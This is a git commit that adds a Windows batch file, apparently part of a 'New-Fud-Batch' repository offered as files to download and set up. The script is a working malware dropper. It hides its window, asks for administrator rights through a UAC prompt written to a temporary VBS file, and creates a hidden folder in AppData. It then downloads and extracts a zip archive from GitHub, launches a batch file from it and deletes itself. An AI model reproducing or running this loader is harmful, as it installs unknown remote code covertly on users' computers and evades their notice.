b26f8e84cdcc164e97fc7b8ea5aa2d17460459f9
AnonAm93 <am9.9@outlook.com>
2024-09-16 22:22:31 +0200

    Add files via upload

---
+++ Download this Files here set it up by yourself/Am.bat
@@ -0,0 +1,34 @@
+@echo off
+
+powershell -window hidden -command ""
+
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0
+
+cd "C:\Users\%USERNAME%\AppData\Local"
+mkdir "Anon"
+attrib +h "Anon" /s /d
+cd C:\Users\%USERNAME%\AppData\Local\Anon" 
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/1.zip' -OutFile 1.zip"
+tar -xf 1.zip
+del 1.zip
+
+start C:\Users\%USERNAME%\AppData\Local\Anon\1.bat"
+
+del "%~f0" & exit
